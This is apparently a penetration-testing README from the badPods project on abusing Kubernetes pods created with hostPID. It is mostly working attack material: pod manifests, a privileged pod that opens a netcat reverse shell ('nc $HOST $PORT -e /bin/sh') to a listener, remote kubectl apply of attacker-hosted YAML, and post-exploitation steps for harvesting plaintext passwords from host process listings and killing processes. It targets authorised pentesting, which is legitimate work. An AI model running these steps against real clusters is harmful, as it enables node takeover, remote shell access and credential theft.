## You can create a pod with only hostPID

You are exploiting the fact that there are no polices preventing the creation of pod with access to the node's filesystem. You are going to create a pod and gain full read/write access to the filesystem of the node the pod is running on. 


# Pod Creation

## Create a pod you can exec into
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostpid
  labels:
    app: hostpid
spec:
  hostPID: true
  containers:
  - image: ubuntu
    command:
      - "sleep"
      - "604800"
    imagePullPolicy: IfNotPresent
    name: hostpid
    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  restartPolicy: Always
  ```
[pod-priv.yaml](pod-priv.yaml)

#### Option 1: Create pod from local yaml 
```bash
kubectl apply -f pod-hostpid.yaml   
```

#### Option 2: Create pod from github hosted yaml
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpid/pod-hostpid.yaml  
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-hostpid -- bash
```

## Or, create a reverse shell pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-priv-revshell
  labels: 
    app: pentest
spec:
  containers:
  - name: priv-revshell
    image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    securityContext:
      privileged: true
    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name```
[pod-hostpid-revshell.yaml](pod-hostpid-revshell.yaml)

#### Set up listener
```bash
nc -nvlp 3116
```

#### Create the pod
```bash
# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
HOST="10.0.0.1" PORT="3116" 
envsubst < ./yaml/hostpid/pod-hostpid-revshell.yaml | kubectl apply -f -
```

#### Catch the shell and chroot to /host 
```bash
~ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```


# Post exploitation

#### View all processes running on the host and look for passwords, tokens, keys, etc. 
```bash
ps -aux
...omitted for brevity...
root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c while true; do ./my-program --grafana-uername=admin --grafana-password=admin; sleep 10;done
...omitted for brevity...
```
Check out that clear text password in the ps output below! 

#### Also, you can also kill any process, but don't do that in production :)

#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.

